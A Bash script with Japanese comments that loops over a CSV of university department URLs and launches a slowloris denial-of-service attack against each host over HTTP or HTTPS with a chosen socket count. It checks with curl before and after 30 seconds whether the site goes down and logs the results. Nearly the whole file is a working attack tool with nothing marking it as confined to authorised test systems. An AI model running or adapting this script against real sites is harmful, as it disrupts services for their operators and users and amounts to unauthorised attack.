#!/bin/bash

# オプション解析
while getopts s: OPT
do
    case $OPT in
        "s" ) sockets_num="$OPTARG" ;;
        * ) echo "Usage: $CMDNAME [-s sockets_num]" 1>&2
            exit 1 ;;
    esac
done

# 入力ファイル
input_file="gakurui_url.csv"

# 出力ファイル
output_file="slowloris_attack_result_$sockets_num.csv"

# ヘッダーを出力ファイルに書き込む
echo "学類名,攻撃前のcurlの終了ステータス,攻撃後のcurlの終了ステータス" > "$output_file"

# ループで各行を処理
while IFS=, read -r url gakurui_name gakugun_name; do
    host=$(echo "$url" | awk -F[/:] '{print $4}')
    
    echo "処理中: $gakurui_name (URL: $url, ホスト: $host)"

    former_flag=$(curl --max-time 5 "$url" > /dev/null; echo $?)

    # 攻撃を開始
    if [[ "$url" =~ ^https ]]; then
        slowloris --port=443 --sleeptime=0 --sockets="$sockets_num" --https "$host" &
    elif [[ "$url" =~ ^http ]]; then
        slowloris --port=80 --sleeptime=0 --sockets="$sockets_num" "$host" &
    fi

    # 攻撃が安定するまで待機
    sleep 30

    # 攻撃後の状態を確認
    latter_flag=$(curl --max-time 5 "$url" > /dev/null; echo $?)

    if pkill -f slowloris; then
        echo "slowlorisを停止しました"
    else
        echo "slowlorisの停止に失敗しました"
    fi

    # 結果を出力ファイルに追記
    echo "$gakurui_name,$former_flag,$latter_flag" >> "$output_file"
done < <(tail -n +2 "$input_file")

echo "処理が完了しました。出力ファイル: $output_file"
